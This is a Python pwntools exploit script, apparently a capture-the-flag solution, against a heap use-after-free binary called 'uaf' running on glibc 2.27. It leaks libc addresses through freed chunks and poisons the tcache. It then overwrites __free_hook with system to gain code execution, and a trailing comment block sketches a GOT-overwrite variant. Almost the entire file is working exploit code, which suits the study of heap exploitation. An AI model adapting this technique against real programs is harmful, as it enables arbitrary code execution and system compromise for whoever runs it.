from pwn import *

process_name = "./uaf"

gs = '''
set breakpoint pending on
break _IO_flush_all_lockp
enable breakpoints once 1
continue
'''

context.terminal = ['tmux', 'splitw', '-h']
p=gdb.debug(process_name, gdbscript=gs)

#p = remote("host1.metaproblems.com",5600)
elf = ELF(process_name)
libc = ELF('libc.so.6')
log.info("LIBC - 2.27")

def malloc(contents):
    p.sendline(b'1')
    p.sendline(contents)
    resp = p.recv()
    print(resp)
    return

def view(index):
    p.sendline(b'2')
    p.sendline(index)
    resp = p.recvuntil(b'Your rule:')
    resp = p.recvuntil(b'\n')
    print(resp)
    return resp

def free(index):
    p.sendline(b'4')
    sleep(.1)
    p.sendline(index)
    resp = p.recv()
    print(resp)
    return

def edit(index,contents):
    p.sendline(b'3')
    p.sendline(index)
    p.sendline(contents)
    resp = p.recv()
    print(resp)
    return

malloc(b'0'*4)
malloc(b'1'*4)
malloc(b'2'*4)
malloc(b'3'*4)
malloc(b'4'*4)
malloc(b'5'*4)
malloc(b'6'*4)


free(b'2')
free(b'1')

pause()

leak = view(b'1') # bin 6 pointer, can we overwrite 
leak = u64(leak.strip().ljust(8, b"\x00")) 
print(hex(leak))
leak = leak-8
edit(b'1',p64(leak))
pause()
malloc(p64((0x110*4)+1))
malloc(p64((0x110*4)+1))


pause()

leak = view(b'2') # bin 6 pointer, can we overwrite 
leak = u64(leak.strip().ljust(8, b"\x00"))

pause()
edit(b'0',p64(0x0))


print(hex(leak))
libc.address = leak - 0xebca0
print(hex(libc.sym.system),hex(libc.sym.printf))

pause()
target = libc.sym.__free_hook
payload = libc.sym.system
edit(b'8', p64(target))
malloc(p64(payload))
malloc(p64(payload))
malloc(p64(payload))
free(b'11')



'''

WRITE WHAT WHERE
free(b'1')
free(b'2')
edit(b'1',p64(elf.got.free))
edit(b'2',p64(elf.got.free)) target 
malloc(p64(0x00000004016e8)) payload
malloc(p64(0x00000004016e8))
'''
